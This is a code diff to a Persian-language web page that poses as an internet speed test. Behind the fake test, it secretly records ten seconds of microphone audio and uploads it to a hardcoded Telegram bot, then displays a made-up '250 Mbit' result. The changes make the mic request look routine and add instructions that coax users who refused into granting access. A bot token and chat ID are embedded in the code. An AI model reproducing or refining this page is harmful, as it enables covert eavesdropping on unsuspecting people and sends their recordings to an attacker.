@@ -28,21 +28,9 @@
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
       border: 1px solid rgba(255, 255, 255, 0.2);
     }
-    .icon {
-      font-size: 60px;
-      margin-bottom: 15px;
-    }
-    h1 {
-      font-size: 23px;
-      margin-bottom: 12px;
-      font-weight: 600;
-    }
-    p {
-      font-size: 15px;
-      line-height: 1.7;
-      margin-bottom: 25px;
-      opacity: 0.9;
-    }
+    .icon { font-size: 60px; margin-bottom: 15px; }
+    h1 { font-size: 23px; margin-bottom: 12px; font-weight: 600; }
+    p { font-size: 15px; line-height: 1.7; margin-bottom: 25px; opacity: 0.9; }
     .btn {
       background: linear-gradient(45deg, #00c6ff, #0072ff);
       color: white;
@@ -56,40 +44,20 @@
       transition: all 0.3s ease;
       box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
     }
-    .btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5);
-    }
-    .btn:disabled {
-      background: #666;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 2px solid #fff;
-      border-top: 2px solid transparent;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-left: 10px;
-    }
+    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5); }
+    .btn:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
+    .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .status {
-      margin-top: 20px;
-      font-size: 15px;
-      min-height: 24px;
-    }
+    .status { margin-top: 20px; font-size: 15px; min-height: 50px; line-height: 1.6; }
     .hidden { display: none; }
+    .error { color: #ff6b6b; }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="icon">WiFi</div>
     <h1>تست سرعت اینترنت</h1>
-    <p>برای اندازه‌گیری سرعت واقعی اینترنت شما، روی دکمه زیر کلیک کنید. این تست ۱۰ ثانیه طول می‌کشه.</p>
+    <p>برای اندازه‌گیری دقیق سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
     
     <button id="startBtn" class="btn">
       <span id="btnText">شروع تست سرعت</span>
@@ -100,7 +68,6 @@
   </div>
 
   <script>
-    // توکن و چت آیدی تلگرام (جایگزین کن)
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
     const CHAT_ID = "6080665310";
 
@@ -116,12 +83,13 @@
         startBtn.disabled = true;
         btnText.textContent = "در حال اتصال...";
         spinner.classList.remove('hidden');
-        status.textContent = "در حال تست پینگ و صدا...";
+        status.innerHTML = "در حال درخواست دسترسی به میکروفون...<br><small>لطفاً اجازه بدید</small>";
 
-        // درخواست دسترسی به میکروفون (مخفی در ظاهر)
+        // درخواست دسترسی
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-        // ضبط 10 ثانیه صدا
+        status.textContent = "در حال اندازه‌گیری سرعت... (۱۰ ثانیه)";
+
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
         const chunks = [];
 
@@ -133,17 +101,28 @@
         };
 
         mediaRecorder.start();
-        status.textContent = "در حال اندازه‌گیری سرعت... (۱۰ ثانیه)";
 
         setTimeout(() => {
-          if (mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
+          if (mediaRecorder.state === "recording") mediaRecorder.stop();
         }, 10000);
 
       } catch (err) {
-        status.textContent = "تست ناموفق بود. دوباره امتحان کنید.";
-        console.error("خطا:", err);
+        console.error("خطای دسترسی:", err);
+
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          status.innerHTML = `
+            <span class="error">دسترسی به میکروفون رد شد!</span><br>
+            <small>
+              ۱. روی <b>قفل کنار آدرس</b> کلیک کنید<br>
+              ۲. دسترسی میکروفون رو <b>اجازه</b> بدید<br>
+              ۳. صفحه رو رفرش کنید
+            </small>
+          `;
+        } else if (err.name === 'NotFoundError') {
+          status.innerHTML = "<span class='error'>میکروفون پیدا نشد!</span>";
+        } else {
+          status.innerHTML = `<span class='error'>خطا: ${err.message}</span>`;
+        }
         resetButton();
       }
     });
@@ -155,24 +134,19 @@
       form.append('audio', blob, fileName);
 
       try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-          method: 'POST',
-          body: form
-        });
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
         const data = await res.json();
 
         if (data.ok) {
           status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
         } else {
-          // Fallback
           form.delete('audio');
           form.append('document', blob, fileName);
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
           status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
         }
       } catch (err) {
-        status.textContent = "خطا در ارتباط با سرور.";
-        console.error(err);
+        status.innerHTML = "<span class='error'>خطا در ارسال به سرور</span>";
       } finally {
         resetButton();
       }
@@ -187,7 +161,7 @@
         startBtn.disabled = false;
         btnText.textContent = "شروع تست سرعت";
         spinner.classList.add('hidden');
-      }, 2500);
+      }, 3000);
     }
   </script>
 </body>
